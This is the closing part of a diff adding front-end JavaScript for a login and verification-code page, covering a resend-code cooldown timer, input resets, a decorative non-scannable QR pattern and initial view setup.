+    inputs.forEach(i => { i.value = ''; });
+    syncVerifyBtn();
+    focusInput(0);
+  }, VERIFY_DELAY_MS);
+});
+
+/* back to login */
+backLink.addEventListener('click', (event) => {
+  event.preventDefault();
+  showLoginView();
+});
+
+/* ===============================================================
+   6. Resend cooldown (30 seconds)
+================================================================ */
+let secondsLeft = RESEND_SECONDS;
+
+function renderTimer() {
+  const minutes = Math.floor(secondsLeft / 60);
+  const seconds = String(secondsLeft % 60).padStart(2, '0');
+  resendTimer.textContent = `Resend code in ${minutes}:${seconds}`;
+}
+
+function startCooldown() {
+  stopCooldown();
+  secondsLeft = RESEND_SECONDS;
+
+  resendTimer.hidden = false;
+  resendBtn.hidden = true;
+  renderTimer();
+
+  cooldownId = setInterval(() => {
+    secondsLeft -= 1;
+
+    if (secondsLeft <= 0) {
+      if (cooldownId !== null) {
+        clearInterval(cooldownId);
+        cooldownId = null;
+      }
+      resendTimer.hidden = true;
+      resendBtn.hidden = false;
+      return;
+    }
+
+    renderTimer();
+  }, 1000);
+}
+
+function stopCooldown() {
+  if (cooldownId !== null) {
+    clearInterval(cooldownId);
+    cooldownId = null;
+  }
+  secondsLeft = RESEND_SECONDS;
+  resendTimer.hidden = false;
+  resendBtn.hidden = true;
+  renderTimer();
+}
+
+resendBtn.addEventListener('click', () => {
+  /* cancel any in-flight verification check */
+  cancelVerifyCheck();
+
+  /* reset inputs and clear any hint/error */
+  resetVerifyState();
+  setHint(verifyHint, '');
+
+  focusInput(0);
+  startCooldown();
+});
+
+/* ===============================================================
+   7. Decorative pseudo-QR (never scannable)
+================================================================ */
+(function buildQR() {
+  const qr = document.getElementById('qr');
+  const N = 21;
+  let seed = 1234567;
+
+  const rand = () => {
+    seed = (seed * 1103515245 + 12345) % 2147483648;
+    return seed / 2147483648;
+  };
+
+  for (let y = 0; y < N; y++) {
+    for (let x = 0; x < N; x++) {
+      const cell = document.createElement('i');
+
+      const inFinder =
+        (x < 7 && y < 7) ||
+        (x >= N - 7 && y < 7) ||
+        (x < 7 && y >= N - 7);
+
+      let on;
+      if (inFinder) {
+        const lx = x >= N - 7 ? x - (N - 7) : x;
+        const ly = y >= N - 7 ? y - (N - 7) : y;
+        on =
+          lx === 0 || lx === 6 || ly === 0 || ly === 6 ||
+          (lx >= 2 && lx <= 4 && ly >= 2 && ly <= 4);
+      } else {
+        on = rand() > 0.5;
+      }
+
+      if (on) cell.className = 'on';
+      qr.appendChild(cell);
+    }
+  }
+})();
+
+/* ===============================================================
+   8. Init + placeholder links
+================================================================ */
+/* only block the placeholder "#" links — real URLs still navigate */
+document.querySelectorAll('a[href="#"]').forEach(link => {
+  link.addEventListener('click', event => event.preventDefault());
+});
+
+/* start on the login screen */
+loginView.hidden = false;
+verifyView.hidden = true;
+setLoginLoading(false);
+setVerifyLoading(false);
+stopCooldown();
+syncVerifyBtn();
+identifierInput.focus();
+</script>
+
+</body>
+</html>
